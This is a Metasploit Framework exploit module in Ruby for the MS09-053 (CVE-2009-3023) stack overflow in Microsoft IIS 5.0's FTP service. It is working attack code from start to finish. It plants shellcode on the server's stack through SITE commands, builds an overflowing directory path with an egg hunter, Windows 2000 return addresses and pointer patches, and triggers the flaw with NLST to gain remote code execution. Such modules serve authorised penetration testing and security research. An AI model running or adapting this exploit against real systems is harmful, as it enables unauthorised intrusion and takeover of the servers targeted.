##
# $Id: ms09_053_ftpd_nlst.rb 10558 2010-10-05 23:39:14Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS FTP Server NLST Response Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP
				service. The flaw is triggered when a special NLST argument is passed
				while the session has changed into a long directory path. For this exploit
				to work, the FTP server must be configured to allow write access to the
				file system (either anonymously or in conjunction with a real account)
			},
			'Author'         => [ 'Kingcope <kcope2[at]googlemail.com>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10558 $',
			'References'     =>
				[
					['URL', 'http://milw0rm.com/exploits/9541'],
					['CVE', '2009-3023'],
					['OSVDB', '57589'],
					['BID', '36189'],
					['MSB', 'MS09-053'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 490,
					'BadChars' => "\x00\x09\x0c\x20\x0a\x0d\x0b",
					# This is for the stored payload, the real BadChar list for file paths is:
					# 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x22\x2a\x2e\x2f\x3a\x3c\x3e\x3f\x5c\x7c
					'StackAdjustment' => -3500,
				},
			'Platform'       => [ 'win' ],
			'Targets'        =>
				[
					[
						'Windows 2000 SP4 English/Italian (IIS 5.0)',
						{
							'Ret'      => 0x773d24eb,  # jmp esp in activeds.dll (English / 5.0.2195.6601)
							'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment
						},
					],
					[
						'Windows 2000 SP3 English (IIS 5.0)',
						{
							'Ret'      => 0x77e42ed8,  # jmp esp in user32.dll (English / 5.0.2195.7032)
							'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment
						},
					],
					[
						# target from TomokiSanaki
						'Windows 2000 SP0-SP3 Japanese (IIS 5.0)',
						{
							'Ret'      => 0x774fa593,  # jmp esp in ?? (Japanese)
							'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment
						},
					],
				],
			'DisclosureDate' => 'Aug 31 2009',
			'DefaultTarget' => 0))

		register_options([Opt::RPORT(21),], self.class)
	end


	def exploit
		connect_login


		based = rand_text_alpha_upper(10)

		res   = send_cmd( ['MKD', based ], true )
		print_status(res.strip)

		if (res !~ /directory created/)
			print_error("The root directory of the FTP server is not writeable")
			disconnect
			return
		end

		res   = send_cmd( ['CWD', based ], true )
		print_status(res.strip)

		egg = rand_text_alpha_upper(4)
		hun = "\xB8\x55\x55\x52\x55\x35\x55\x55\x55\x55\x40\x81\x38#{egg}\x75\xF7\x40\x40\x40\x40\xFF\xE0"

		# This egg hunter is necessary because of the huge set of restricted characters for directory names
		# The best that metasploit could so was 133 bytes for an alphanum encoded egg hunter
		# The egg hunter above was written by kcope and searches from 0x70000 forward (stack) in order
		# to locate the real shellcode. The only change from the original hunter was to randomize the
		# prefix used.

		# Store our real shellcode on the stack
		1.upto(5) do
			res = send_cmd( ['SITE', egg + payload.encoded.gsub("\xff", "\xff\xff") ], true )
		end

		# Create the directory path that will be used in the overflow
		pre = rand_text_alpha_upper(3)              # esp+0x28 points here
		pst = rand_text_alpha_upper(210)            # limited by max path

		pst[  0, hun.length]  = hun                 # egg hunter
		pst[ 90,  4]  = [target['Patch']].pack('V') # patch smashed pointers
		pst[ 94,  4]  = [target['Patch']].pack('V')	# patch smashed pointers
		pst[140, 32]  = [target['Patch']].pack('V') * 8  # patch smashed pointers
		pst[158,  4]  = [target.ret].pack("V")      # return
		pst[182,  5]  = "\xe9" + [-410].pack("V")   # jmp back

		# Escape each 0xff with another 0xff for FTP
		pst = pst.gsub("\xff", "\xff\xff")

		print_status("Creating long directory...")
		res   = send_cmd( ['MKD', pre+pst ], true )
		print_status(res.strip)

		srv	  = Rex::Socket::TcpServer.create(
			'LocalHost' => '0.0.0.0',
			'LocalPort' =>  0,
			'SSL'       => false,
			'Context'   => {
					'Msf'        => framework,
					'MsfExploit' => self,
			}
		)

		add_socket(srv)

		begin

		thr = Thread.new { srv.accept }

			prt   = srv.getsockname[2]
			prt1  = prt / 256
			prt2  = prt % 256

			addr  = Rex::Socket.source_address(rhost).gsub(".", ",") + ",#{prt1},#{prt2}"

			res   = send_cmd( ['PORT', addr ], true )
			print_status(res.strip)

			print_status("Trying target #{target.name}...")

			res   = send_cmd( ['NLST', pre+pst + "*/../" + pre + "*/"], true )
			print_status(res.strip) if res

			select(nil,nil,nil,2)

			handler
			disconnect

		ensure
			thr.kill
			srv.close

		end
	end

end

